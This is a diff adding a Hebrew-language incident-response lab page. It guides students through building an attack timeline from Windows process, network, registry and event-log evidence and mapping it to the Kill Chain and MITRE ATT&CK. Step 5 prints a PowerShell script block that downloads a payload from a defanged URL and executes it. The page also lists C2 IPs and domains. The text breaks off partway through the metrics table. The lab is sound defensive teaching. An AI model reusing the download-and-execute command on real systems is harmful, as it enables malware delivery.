@@ -1,0 +1,747 @@
+<!DOCTYPE html>
+<html lang="he" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>יום 6 — מעבדה 3: בניית ציר זמן — Local</title>
+<style>
+:root {
+  --primary: #2563eb;
+  --primary-dark: #1d4ed8;
+  --primary-light: #3b82f6;
+  --bg: #ffffff;
+  --bg-card: #f8f9ff;
+  --text: #1a1a2e;
+  --text-muted: #64748b;
+  --border: #e2e8f0;
+  --success: #16a34a;
+  --warning: #d97706;
+  --red: #dc2626;
+}
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: 'Segoe UI', Tahoma, Arial, sans-serif;
+  background: var(--bg);
+  color: var(--text);
+  line-height: 1.8;
+  direction: rtl;
+  text-align: right;
+}
+.header {
+  background: #f0f4ff;
+  border-bottom: 3px solid var(--primary);
+  padding: 1.5rem 2rem 1rem;
+  text-align: center;
+}
+.header h1 { font-size: 1.8rem; color: var(--primary-dark); margin-bottom: .3rem; }
+.header .subtitle { color: var(--text-muted); font-size: .95rem; margin-top: .4rem; }
+.header .meta { margin-top: .6rem; }
+.header .meta span {
+  display: inline-block; margin: 0 .4rem;
+  background: white; border: 1px solid var(--border);
+  border-radius: 4px; padding: .15rem .7rem; font-size: .82rem;
+  color: var(--text-muted);
+}
+.container { max-width: 960px; margin: 0 auto; padding: 2rem 1.5rem; }
+.section {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 1.5rem;
+  margin-bottom: 1.5rem;
+}
+.section h2 {
+  font-size: 1.2rem;
+  color: var(--primary-dark);
+  margin-bottom: 1rem;
+  border-bottom: 2px solid var(--border);
+  padding-bottom: .5rem;
+}
+.section h3 {
+  font-size: 1rem;
+  color: var(--primary);
+  margin: 1rem 0 .5rem;
+}
+ol.steps { counter-reset: step; list-style: none; padding: 0; margin: 0; }
+.step {
+  counter-increment: step;
+  position: relative;
+  padding: 1rem 1rem 1rem 3.5rem;
+  margin-bottom: 1rem;
+  background: #f8f9ff;
+  border-radius: 8px;
+  border-right: 4px solid var(--primary);
+}
+.step::before {
+  content: "שלב " counter(step);
+  font-weight: 700;
+  color: var(--primary);
+  position: absolute;
+  right: 1rem;
+  top: 1rem;
+}
+code {
+  font-family: 'Cascadia Code', 'Consolas', monospace;
+  background: #f0f4ff;
+  color: var(--primary-dark);
+  padding: .15rem .45rem;
+  border-radius: 4px;
+  font-size: .87rem;
+  border: 1px solid var(--border);
+  direction: ltr;
+  text-align: left;
+  display: inline-block;
+  unicode-bidi: embed;
+}
+pre {
+  background: #0d0d1a;
+  border: 1px solid #2a2a4a;
+  border-radius: 8px;
+  padding: 1rem 1.2rem;
+  font-family: 'Cascadia Code', 'Consolas', monospace;
+  font-size: .85rem;
+  color: #a8e6cf;
+  overflow-x: auto;
+  margin: .6rem 0;
+  direction: ltr;
+  text-align: left;
+}
+.note {
+  background: #fffbeb;
+  border-right: 4px solid var(--warning);
+  border-radius: 6px;
+  padding: .75rem 1rem;
+  margin: .8rem 0;
+  font-size: .9rem;
+}
+.note::before { content: "הערה: "; font-weight: 700; color: var(--warning); }
+.warning {
+  background: #fff1f2;
+  border-right: 4px solid var(--red);
+  border-radius: 6px;
+  padding: .75rem 1rem;
+  margin: .8rem 0;
+  font-size: .9rem;
+}
+.warning::before { content: "אזהרה: "; font-weight: 700; color: var(--red); }
+.success {
+  background: #f0fdf4;
+  border-right: 4px solid var(--success);
+  border-radius: 6px;
+  padding: .75rem 1rem;
+  margin: .8rem 0;
+  font-size: .9rem;
+}
+.success::before { content: "תוצאה צפויה: "; font-weight: 700; color: var(--success); }
+ul.prereq { padding-right: 1.5rem; margin: .5rem 0; }
+ul.prereq li { margin-bottom: .3rem; font-size: .92rem; }
+footer {
+  text-align: center;
+  padding: 1.5rem;
+  color: var(--text-muted);
+  font-size: .85rem;
+  border-top: 1px solid var(--border);
+  margin-top: 2rem;
+}
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: .8rem 0;
+  font-size: .88rem;
+}
+th {
+  background: #f0f4ff;
+  color: var(--primary-dark);
+  padding: .6rem .8rem;
+  border: 1px solid var(--border);
+  text-align: right;
+  font-weight: 600;
+}
+td {
+  padding: .6rem .8rem;
+  border: 1px solid var(--border);
+  vertical-align: top;
+}
+.question-box {
+  background: #f5f3ff;
+  border: 1px solid #c4b5fd;
+  border-radius: 8px;
+  padding: 1rem;
+  margin: .8rem 0;
+}
+.question-box h4 { color: #6d28d9; margin-bottom: .5rem; font-size: .95rem; }
+.question-box ol { padding-right: 1.5rem; }
+.question-box li { font-size: .9rem; margin-bottom: .4rem; }
+.mitre-tag {
+  display: inline-block;
+  background: #fef3c7;
+  color: #92400e;
+  border: 1px solid #fcd34d;
+  border-radius: 4px;
+  padding: .1rem .5rem;
+  font-size: .78rem;
+  font-weight: 600;
+  direction: ltr;
+}
+.killchain-tag {
+  display: inline-block;
+  border-radius: 4px;
+  padding: .1rem .5rem;
+  font-size: .78rem;
+  font-weight: 600;
+}
+.kc-recon { background: #dbeafe; color: #1e40af; border: 1px solid #93c5fd; }
+.kc-weapon { background: #fce7f3; color: #9d174d; border: 1px solid #f9a8d4; }
+.kc-deliver { background: #fef3c7; color: #92400e; border: 1px solid #fcd34d; }
+.kc-exploit { background: #fee2e2; color: #991b1b; border: 1px solid #fca5a5; }
+.kc-install { background: #ede9fe; color: #5b21b6; border: 1px solid #c4b5fd; }
+.kc-c2 { background: #fce7f3; color: #831843; border: 1px solid #f9a8d4; }
+.kc-actions { background: #fee2e2; color: #7f1d1d; border: 1px solid #fca5a5; }
+
+.timeline-entry {
+  background: white;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: .8rem 1rem;
+  margin: .6rem 0;
+  border-right: 4px solid var(--primary-light);
+}
+.timeline-entry .time {
+  font-family: 'Cascadia Code', 'Consolas', monospace;
+  color: var(--primary);
+  font-size: .85rem;
+  font-weight: 600;
+}
+.timeline-entry .event { margin-top: .3rem; font-size: .9rem; }
+.timeline-entry .source { color: var(--text-muted); font-size: .8rem; }
+.artifact-box {
+  background: #f0f4ff;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 1rem;
+  margin: .8rem 0;
+}
+.artifact-box h4 { color: var(--primary-dark); font-size: .95rem; margin-bottom: .5rem; }
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>יום 6 — מעבדה 3: בניית ציר זמן</h1>
+  <div class="subtitle">Timeline Building — ניתוח ידני של קבצי לוג, זיהוי IOCs, ומיפוי ל-Kill Chain</div>
+  <div class="meta">
+    <span>זמן משוער: 75 דקות</span>
+    <span>רמה: מתקדם</span>
+    <span>סביבה: Local (Windows)</span>
+  </div>
+</div>
+
+<div class="container">
+
+<div class="section">
+  <h2>מה נלמד</h2>
+  <ul class="prereq">
+    <li>בניית ציר זמן (Attack Timeline) ידנית מתוך קבצי לוג וארטיפקטים</li>
+    <li>ניתוח Windows Event Logs (Security, System, PowerShell)</li>
+    <li>זיהוי IOCs (Indicators of Compromise) מתוך ראיות</li>
+    <li>מיפוי אירועים ל-Cyber Kill Chain של Lockheed Martin</li>
+    <li>מיפוי כפול ל-MITRE ATT&CK techniques</li>
+    <li>חישוב MTTD, MTTR, ו-Dwell Time</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>תרחיש האירוע</h2>
+  <p><strong>מזהה אירוע:</strong> INC-2026-0099 &middot; <strong>תאריך:</strong> 2026-05-18 (יום ב')</p>
+  <p>קיבלת תיקיית ראיות (C:\IR) שנאספה ע"י אנליסט ב-<strong>Lab 2 Local</strong> ממכונה <strong>WS-SALES-07</strong>.
+  המשימה שלך: לנתח את כל הראיות, לבנות ציר זמן מלא של ההתקפה, לזהות את כל ה-IOCs,
+  ולמפות כל שלב ל-Cyber Kill Chain ול-MITRE ATT&amp;CK.</p>
+
+  <div class="warning-box" style="background:#fef3c7;border-right:4px solid #d97706;padding:.8rem 1rem;border-radius:6px;margin:.8rem 0;font-size:.92rem">
+    <strong>לא ביצעת את Lab 2? אין לך תיקיית ראיות?</strong>
+    <ol style="margin-top:.5rem;padding-right:1.2rem">
+      <li><strong>אופציה A — Sample Evidence Pack:</strong> בקש מהמדריך את חבילת הראיות המוכנה
+        (קובץ ZIP עם כל ה-CSV/TXT/EVTX). חלץ ל-<code>C:\IR\</code>.</li>
+      <li><strong>אופציה B — נתונים מוטמעים:</strong> כל שלב למטה כולל "פלט צפוי" עם נתוני הראיות.
+        אתה יכול לעבוד על המעבדה רק מהפלטים המוטמעים — אין צורך בקבצים אמיתיים.</li>
+      <li><strong>אופציה C — צור בעצמך:</strong> חזור ל-Lab 2 Local והרץ את הפקודות על מכונת Windows
+        (אפילו על המכונה שלך — אם אין malware אמיתי, התוצאות יהיו "נקיות" אך תלמד את הזרימה).</li>
+    </ol>
+  </div>
+
+  <p><strong>ראיות זמינות ב-C:\IR:</strong></p>
+  <ul class="prereq">
+    <li><code>processes_wmic.csv</code> — תהליכים רצים</li>
+    <li><code>netstat_full.txt</code> — חיבורי רשת</li>
+    <li><code>persistence_registry.txt</code> — Registry Run keys</li>
+    <li><code>scheduled_tasks.csv</code> — Scheduled Tasks</li>
+    <li><code>Security.evtx</code> — Windows Security Event Log</li>
+    <li><code>PowerShell_Operational.evtx</code> — PowerShell logs</li>
+    <li><code>dns_cache.txt</code> — DNS cache</li>
+    <li><code>local_admins.txt</code> — Local Administrators group</li>
+    <li><code>suspicious_svchost.exe</code> — קובץ חשוד שנאסף</li>
+    <li><code>evidence_hashes.txt</code> — Hash values</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>דרישות מוקדמות</h2>
+  <ul class="prereq">
+    <li>מכונת Windows עם הרשאות Administrator</li>
+    <li>Event Viewer (מובנה ב-Windows)</li>
+    <li>גישה לקבצי הראיות ב-C:\IR (ממעבדה 2, או קבצי דוגמה)</li>
+    <li>דפדפן עם גישה ל-VirusTotal (<code>virustotal.com</code>)</li>
+    <li>דפדפן עם גישה ל-MITRE ATT&CK (<code>attack.mitre.org</code>)</li>
+    <li>אופציונלי: Notepad++ או VS Code לניתוח קבצי טקסט</li>
+    <li>מסמך Word / טבלת Excel לתיעוד ציר הזמן</li>
+  </ul>
+</div>
+
+<div class="section">
+  <h2>שלבי המעבדה</h2>
+  <ol class="steps">
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 1</div>
+      <strong>ניתוח תהליכים (processes_wmic.csv)</strong>
+      <p>פתח את <code>C:\IR\processes_wmic.csv</code> ב-Excel או Notepad++.</p>
+      <p>חפש תהליכים חשודים לפי הקריטריונים הבאים:</p>
+      <ul>
+        <li>תהליכים שרצים מ-<code>C:\Users\*\AppData\</code> או <code>C:\Temp\</code></li>
+        <li>תהליכים עם שמות של תהליכי מערכת (svchost, csrss) אך מנתיב שגוי</li>
+        <li>PowerShell עם פרמטרים <code>-enc</code> (encoded) או <code>-w hidden</code></li>
+        <li>תהליכים ללא חתימה דיגיטלית (unsigned)</li>
+      </ul>
+
+      <pre>REM === סינון תהליכים חשודים ===
+REM פתח CMD ב-C:\IR:
+findstr /i "Temp AppData ProgramData" processes_wmic.csv > suspicious_processes.txt
+findstr /i "powershell cmd" processes_wmic.csv > shell_processes.txt</pre>
+
+      <p>מלא את הטבלה:</p>
+      <table>
+        <tr><th>PID</th><th>שם תהליך</th><th>נתיב</th><th>שורת פקודה</th><th>Parent PID</th><th>זמן יצירה</th><th>חשוד?</th></tr>
+        <tr><td>6712</td><td>svchost.exe</td><td>C:\Users\...\Temp\</td><td>svchost.exe -connect</td><td>5840</td><td>09:15:00</td><td style="color:var(--red)">כן!</td></tr>
+        <tr><td>5840</td><td>powershell.exe</td><td>C:\Windows\System32\</td><td>powershell -enc JABj...</td><td>3200</td><td>09:14:30</td><td style="color:var(--red)">כן!</td></tr>
+        <tr><td>3200</td><td>WINWORD.EXE</td><td>C:\Program Files\...</td><td>WINWORD.EXE /n "..."</td><td>1024</td><td>09:12:00</td><td style="color:var(--warning)">חשוד (parent)</td></tr>
+      </table>
+
+      <div class="note">שרשרת Parent-Child: WINWORD.EXE (3200) → powershell.exe (5840) → svchost.exe (6712). זו שרשרת הרצה קלאסית של malware מ-macro!</div>
+      <div class="success">תהליכים חשודים זוהו עם שרשרת Parent-Child מלאה</div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 2</div>
+      <strong>ניתוח חיבורי רשת (netstat_full.txt)</strong>
+      <p>פתח את <code>C:\IR\netstat_full.txt</code>.</p>
+      <p>חפש:</p>
+      <ul>
+        <li>חיבורי ESTABLISHED לכתובות IP חיצוניות</li>
+        <li>חיבורים מתהליכים חשודים (PID 6712)</li>
+        <li>פורטים לא סטנדרטיים</li>
+      </ul>
+
+      <pre>REM === סינון חיבורים חשודים ===
+findstr "ESTABLISHED" C:\IR\netstat_full.txt > C:\IR\established_connections.txt
+findstr "6712" C:\IR\netstat_full.txt > C:\IR\pid_6712_connections.txt</pre>
+
+      <p>ממצאים צפויים:</p>
+      <pre>  Proto  Local Address          Foreign Address        State           PID
+  TCP    10.0.1.70:49823        185.220.101.42:443     ESTABLISHED     6712
+  TCP    10.0.1.70:49824        185.220.101.42:443     ESTABLISHED     6712
+
+// PID 6712 = svchost.exe מ-Temp → מתחבר ל-185.220.101[.]42 על HTTPS
+// זהו שרת ה-C2!</pre>
+
+      <table>
+        <tr><th>IOC</th><th>סוג</th><th>פרטים</th></tr>
+        <tr><td>185.220.101[.]42</td><td>C2 IP</td><td>HTTPS/443, 2 connections from PID 6712</td></tr>
+      </table>
+      <div class="success">שרת C2 זוהה: 185.220.101[.]42:443</div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 3</div>
+      <strong>ניתוח DNS Cache (dns_cache.txt)</strong>
+      <pre>REM === חפש דומיינים חשודים ===
+type C:\IR\dns_cache.txt | findstr /i "Record Name"</pre>
+
+      <p>ממצאים צפויים:</p>
+      <pre>Record Name: update-cdn[.]jobportal[.]xyz
+Record Name: data-sync[.]secure-transfer[.]top
+Record Name: www.google.com
+Record Name: login.microsoftonline.com
+Record Name: company.sharepoint.com
+
+// שני דומיינים חשודים:
+// update-cdn.jobportal.xyz — ככל הנראה שרת ההורדה של ה-payload
+// data-sync.secure-transfer.top — ייתכן DNS exfiltration/C2 נוסף</pre>
+
+      <table>
+        <tr><th>IOC</th><th>סוג</th><th>הערות</th></tr>
+        <tr><td>update-cdn[.]jobportal[.]xyz</td><td>Domain</td><td>Payload hosting</td></tr>
+        <tr><td>data-sync[.]secure-transfer[.]top</td><td>Domain</td><td>Possible secondary C2</td></tr>
+      </table>
+      <div class="success">2 דומיינים חשודים זוהו מ-DNS cache</div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 4</div>
+      <strong>ניתוח Persistence (persistence_registry.txt + scheduled_tasks.csv)</strong>
+      <pre>REM === בדוק את הממצאים ===
+type C:\IR\persistence_registry.txt</pre>
+
+      <p>ממצאים צפויים:</p>
+      <pre>=== HKCU Run ===
+HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
+    WindowsUpdateSvc    REG_SZ    C:\Users\sales.user\AppData\Local\Temp\svchost.exe -connect
+
+=== HKLM Run ===
+    (no suspicious entries)</pre>
+
+      <pre>REM === בדוק Scheduled Tasks ===
+findstr /i "svchost\|update\|Temp" C:\IR\scheduled_tasks.csv</pre>
+
+      <p>ממצאים צפויים:</p>
+      <pre>"Microsoft\Windows\UpdateService","C:\Users\sales.user\AppData\Local\Temp\svchost.exe -connect","CORP\sales.user","Ready","At logon"</pre>
+
+      <pre>REM === בדוק Local Admins ===
+type C:\IR\local_admins.txt</pre>
+      <pre>Members:
+  Administrator
+  sales.user
+  svc_update    ← UNAUTHORIZED ACCOUNT</pre>
+
+      <table>
+        <tr><th>Persistence Type</th><th>פרטים</th><th>Kill Chain Stage</th></tr>
+        <tr><td>Registry Run Key</td><td>HKCU\...\Run\WindowsUpdateSvc</td><td><span class="killchain-tag kc-install">Installation</span></td></tr>
+        <tr><td>Scheduled Task</td><td>\Microsoft\Windows\UpdateService</td><td><span class="killchain-tag kc-install">Installation</span></td></tr>
+        <tr><td>Local Admin Account</td><td>svc_update</td><td><span class="killchain-tag kc-install">Installation</span></td></tr>
+      </table>
+      <div class="success">3 מנגנוני Persistence זוהו</div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 5</div>
+      <strong>ניתוח Windows Event Logs</strong>
+      <p>פתח <strong>Event Viewer</strong> → Action → Open Saved Log → בחר <code>C:\IR\Security.evtx</code></p>
+
+      <h3>חיפוש 1: יצירת חשבון (Event ID 4720)</h3>
+      <p>Filter Current Log → Event ID: 4720</p>
+      <pre>Event ID: 4720 — A user account was created
+Time: 2026-05-18 09:18:32
+Subject:
+  Account Name: sales.user
+  Account Domain: CORP
+Target Account:
+  Account Name: svc_update
+  Account Domain: WS-SALES-07
+
+// sales.user (compromised) created svc_update account</pre>
+
+      <h3>חיפוש 2: הוספה לקבוצת Admins (Event ID 4732)</h3>
+      <pre>Event ID: 4732 — A member was added to a security-enabled local group
+Time: 2026-05-18 09:18:35
+Group: Administrators
+Member: svc_update
+Subject: sales.user</pre>
+
+      <h3>חיפוש 3: Logon Events (Event ID 4624)</h3>
+      <p>Filter: Event ID 4624, check for unusual logons:</p>
+      <pre>Event ID: 4624 — An account was successfully logged on
+Time: 2026-05-18 09:45:12
+Logon Type: 3 (Network)
+Account: CORP\sales.user
+Source Network Address: 10.0.1.70
+Workstation: SRV-FILES-02
+
+// sales.user logged in to SRV-FILES-02 remotely — LATERAL MOVEMENT!</pre>
+
+      <h3>חיפוש 4: Service Installation (Event ID 7045 ב-System.evtx)</h3>
+      <p>פתח <code>C:\IR\System.evtx</code> → Filter: Event ID 7045</p>
+      <pre>Event ID: 7045 — A service was installed in the system
+Time: 2026-05-18 09:20:00
+Service Name: WindowsUpdateHelper
+Service File Name: C:\Users\sales.user\AppData\Local\Temp\svchost.exe
+Service Type: user mode service
+Service Start Type: auto start
+
+// Yet another persistence mechanism via service!</pre>
+
+      <h3>חיפוש 5: PowerShell Script Blocks (Event ID 4104)</h3>
+      <p>פתח <code>C:\IR\PowerShell_Operational.evtx</code> → Filter: Event ID 4104</p>
+      <pre>Event ID: 4104 — Script Block Logging
+Time: 2026-05-18 09:14:30
+
+ScriptBlock Text:
+$client = New-Object System.Net.WebClient
+$client.DownloadFile(
+  "hxxps://update-cdn.jobportal[.]xyz/payloads/svchost.exe",
+  "$env:TEMP\svchost.exe"
+)
+Start-Process "$env:TEMP\svchost.exe" -ArgumentList "-connect"
+
+// The decoded PowerShell command! Downloads and executes the malware</pre>
+
+      <h3>חיפוש 6: Audit Log Cleared? (Event ID 1102)</h3>
+      <pre>REM === בדוק אם הלוג נמחק ===
+REM Filter: Event ID 1102 ב-Security.evtx
+
+// Result: NO events found
+// Good — the attacker didn't clear the logs (yet)</pre>
+
+      <div class="success">Event Logs מנותחים: יצירת חשבון, הוספה ל-Admins, lateral movement, service install, ו-PowerShell payload</div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 6</div>
+      <strong>בדיקת Hash ב-VirusTotal</strong>
+      <pre>REM === קח את ה-Hash מקובץ evidence_hashes.txt ===
+type C:\IR\evidence_hashes.txt</pre>
+      <p>קח את ה-SHA256 של suspicious_svchost.exe ובדוק ב-virustotal.com:</p>
+
+      <div class="artifact-box">
+        <h4>VirusTotal Results — suspicious_svchost.exe</h4>
+        <table>
+          <tr><th>Field</th><th>Value</th></tr>
+          <tr><td>SHA256</td><td><code>a3b4c5d6e7f890123456789abcdef...</code></td></tr>
+          <tr><td>Detection</td><td>45/70 engines detect as malicious</td></tr>
+          <tr><td>Family</td><td>Trojan.GenericKD / Cobalt Strike Beacon</td></tr>
+          <tr><td>First Seen</td><td>2026-04-28 (8 days before our incident)</td></tr>
+          <tr><td>C2 IPs</td><td>185.220.101[.]42, 203.0.113[.]42</td></tr>
+          <tr><td>Behavior</td><td>Creates persistence, connects to C2, executes commands</td></tr>
+        </table>
+      </div>
+
+      <p>בדוק גם את ה-IP:</p>
+      <div class="artifact-box">
+        <h4>AbuseIPDB Results — 185.220.101[.]42</h4>
+        <table>
+          <tr><th>Field</th><th>Value</th></tr>
+          <tr><td>ISP</td><td>Suspicious VPS Provider</td></tr>
+          <tr><td>Country</td><td>Netherlands</td></tr>
+          <tr><td>Abuse Reports</td><td>127 reports in last 30 days</td></tr>
+          <tr><td>Categories</td><td>C2 Server, Malware Distribution</td></tr>
+        </table>
+      </div>
+      <div class="success">Malware מזוהה כ-Cobalt Strike Beacon, IP מדווח כ-C2 server</div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 7</div>
+      <strong>בניית ציר הזמן המלא</strong>
+      <p>על סמך כל הניתוחים, בנה את ציר הזמן:</p>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:10:00 UTC (משוער)</div>
+        <div class="source">מקור: הנחה (אימייל פישינג)</div>
+        <div class="event">אימייל פישינג עם קובץ Word זדוני התקבל ע"י sales.user</div>
+        <div><span class="killchain-tag kc-deliver">Delivery</span> <span class="mitre-tag">T1566.001</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:12:00 UTC</div>
+        <div class="source">מקור: processes_wmic.csv (WINWORD.EXE creation time)</div>
+        <div class="event">המשתמש פתח את קובץ ה-Word. Macro הופעל.</div>
+        <div><span class="killchain-tag kc-exploit">Exploitation</span> <span class="mitre-tag">T1204.002</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:14:30 UTC</div>
+        <div class="source">מקור: PowerShell_Operational.evtx (Event ID 4104)</div>
+        <div class="event">PowerShell הורד payload מ-hxxps://update-cdn.jobportal[.]xyz/payloads/svchost.exe</div>
+        <div><span class="killchain-tag kc-exploit">Exploitation</span> <span class="mitre-tag">T1059.001</span> <span class="mitre-tag">T1105</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:15:00 UTC</div>
+        <div class="source">מקור: processes_wmic.csv (svchost.exe PID 6712)</div>
+        <div class="event">svchost.exe (malware) הופעל מ-AppData\Local\Temp עם פרמטר -connect</div>
+        <div><span class="killchain-tag kc-install">Installation</span> <span class="mitre-tag">T1036.005</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:15:05 UTC (משוער)</div>
+        <div class="source">מקור: netstat_full.txt</div>
+        <div class="event">חיבור C2 ראשון ל-185.220.101[.]42:443</div>
+        <div><span class="killchain-tag kc-c2">C2</span> <span class="mitre-tag">T1071.001</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:15:30 UTC (משוער)</div>
+        <div class="source">מקור: persistence_registry.txt</div>
+        <div class="event">Persistence: Registry Run key נוסף — WindowsUpdateSvc</div>
+        <div><span class="killchain-tag kc-install">Installation</span> <span class="mitre-tag">T1547.001</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:18:32 UTC</div>
+        <div class="source">מקור: Security.evtx (Event ID 4720)</div>
+        <div class="event">חשבון מקומי svc_update נוצר ע"י sales.user</div>
+        <div><span class="killchain-tag kc-install">Installation</span> <span class="mitre-tag">T1136.001</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:18:35 UTC</div>
+        <div class="source">מקור: Security.evtx (Event ID 4732)</div>
+        <div class="event">svc_update נוסף לקבוצת Administrators</div>
+        <div><span class="killchain-tag kc-install">Installation</span> <span class="mitre-tag">T1098</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:20:00 UTC</div>
+        <div class="source">מקור: System.evtx (Event ID 7045)</div>
+        <div class="event">Service "WindowsUpdateHelper" הותקן — persistence נוסף</div>
+        <div><span class="killchain-tag kc-install">Installation</span> <span class="mitre-tag">T1543.003</span></div>
+      </div>
+
+      <div class="timeline-entry">
+        <div class="time">2026-05-18 09:45:12 UTC</div>
+        <div class="source">מקור: Security.evtx (Event ID 4624)</div>
+        <div class="event">Lateral Movement: sales.user התחבר ל-SRV-FILES-02 (Network Logon)</div>
+        <div><span class="killchain-tag kc-actions">Actions on Objectives</span> <span class="mitre-tag">T1021.002</span></div>
+      </div>
+
+      <div class="timeline-entry" style="border-right-color:var(--success)">
+        <div class="time">2026-05-18 10:30:00 UTC (משוער)</div>
+        <div class="source">מקור: IR team actions</div>
+        <div class="event" style="color:var(--success)">DETECTION: AV report + manual investigation started</div>
+      </div>
+
+      <div class="timeline-entry" style="border-right-color:var(--success)">
+        <div class="time">2026-05-18 11:00:00 UTC (משוער)</div>
+        <div class="source">מקור: IR team actions</div>
+        <div class="event" style="color:var(--success)">CONTAINMENT: Machine isolated, accounts disabled</div>
+      </div>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 8</div>
+      <strong>מיפוי ל-Cyber Kill Chain</strong>
+      <p>מפה את כל השלבים ל-Lockheed Martin Cyber Kill Chain:</p>
+
+      <table>
+        <tr><th>Kill Chain Stage</th><th>שלב בעברית</th><th>אירוע</th><th>ראיה</th><th>MITRE ATT&CK</th></tr>
+        <tr><td><span class="killchain-tag kc-recon">1. Reconnaissance</span></td><td>סיור</td><td>התוקף זיהה את sales.user כיעד (HR/Finance)</td><td>הנחה — אימייל ממוקד</td><td>T1598 — Phishing for Info</td></tr>
+        <tr><td><span class="killchain-tag kc-weapon">2. Weaponization</span></td><td>חימוש</td><td>יצירת Word doc עם Macro + Cobalt Strike payload</td><td>VirusTotal — first seen 8 days ago</td><td>&mdash;</td></tr>
+        <tr><td><span class="killchain-tag kc-deliver">3. Delivery</span></td><td>הפצה</td><td>אימייל פישינג עם קובץ מצורף</td><td>הנחה (אימייל לא נשמר מקומית)</td><td>T1566.001</td></tr>
+        <tr><td><span class="killchain-tag kc-exploit">4. Exploitation</span></td><td>ניצול</td><td>משתמש פתח Doc → Macro → PowerShell → Download</td><td>processes_wmic, PowerShell.evtx</td><td>T1204.002, T1059.001</td></tr>
+        <tr><td><span class="killchain-tag kc-install">5. Installation</span></td><td>התקנה</td><td>svchost.exe saved + Run key + Task + Service + Account</td><td>Registry, Tasks, Services, Event 4720</td><td>T1547.001, T1053, T1543.003, T1136.001</td></tr>
+        <tr><td><span class="killchain-tag kc-c2">6. Command & Control</span></td><td>שליטה</td><td>HTTPS beacon ל-185.220.101[.]42:443</td><td>netstat_full.txt</td><td>T1071.001, T1573.002</td></tr>
+        <tr><td><span class="killchain-tag kc-actions">7. Actions on Objectives</span></td><td>פעולות</td><td>Lateral movement ל-SRV-FILES-02</td><td>Security.evtx Event 4624</td><td>T1021.002</td></tr>
+      </table>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 9</div>
+      <strong>סיכום IOCs</strong>
+      <p>רכז את כל ה-IOCs שזוהו:</p>
+
+      <table>
+        <tr><th>#</th><th>סוג</th><th>ערך (Defanged)</th><th>מקור</th><th>Confidence</th></tr>
+        <tr><td>1</td><td>File Hash (SHA256)</td><td><code>a3b4c5d6e7f890...</code></td><td>certutil</td><td>High</td></tr>
+        <tr><td>2</td><td>File Path</td><td><code>C:\Users\*\AppData\Local\Temp\svchost.exe</code></td><td>processes_wmic</td><td>High</td></tr>
+        <tr><td>3</td><td>C2 IP</td><td><code>185.220.101[.]42</code></td><td>netstat</td><td>High</td></tr>
+        <tr><td>4</td><td>Domain</td><td><code>update-cdn[.]jobportal[.]xyz</code></td><td>dns_cache, PS logs</td><td>High</td></tr>
+        <tr><td>5</td><td>Domain</td><td><code>data-sync[.]secure-transfer[.]top</code></td><td>dns_cache</td><td>Medium</td></tr>
+        <tr><td>6</td><td>Registry Key</td><td><code>HKCU\...\Run\WindowsUpdateSvc</code></td><td>reg query</td><td>High</td></tr>
+        <tr><td>7</td><td>Scheduled Task</td><td><code>\Microsoft\Windows\UpdateService</code></td><td>schtasks</td><td>High</td></tr>
+        <tr><td>8</td><td>Service</td><td><code>WindowsUpdateHelper</code></td><td>System.evtx 7045</td><td>High</td></tr>
+        <tr><td>9</td><td>User Account</td><td><code>svc_update</code></td><td>net localgroup, 4720</td><td>High</td></tr>
+        <tr><td>10</td><td>Download URL</td><td><code>hxxps://update-cdn[.]jobportal[.]xyz/payloads/svchost[.]exe</code></td><td>PS 4104</td><td>High</td></tr>
+      </table>
+    </li>
+
+    <li class="step"><div style="font-weight:700;color:#2563eb;margin-bottom:.5rem;font-size:.95rem">שלב 10</div>
+      <strong>חישוב מדדים (Metrics)</strong>
+      <table>
+        <tr><th>מדד</th><th>חישוב</th><th>ערך</th></tr>
+        <tr><td><strong>Initial Access Time</strong></td><td>PowerShell execution (first malicious activity)</td><td>09:14:30 UTC</td></tr>
+        <tr><td><strong>Detection Time</strong></td><td>User report + investigation start</td><td>10:30:00 UTC</td></tr>
+        <tr><td><strong>MTTD (Mean Time to Detect)</strong></td><td>Detection - Initial Access</td><td><strong>1 שעה ו-15 דקות</strong></td></tr>
+        <tr><td><strong>Containment Time</strong></td><td>Machine isolated, accounts disabled</td><td>11:00:00 UTC</td></tr>
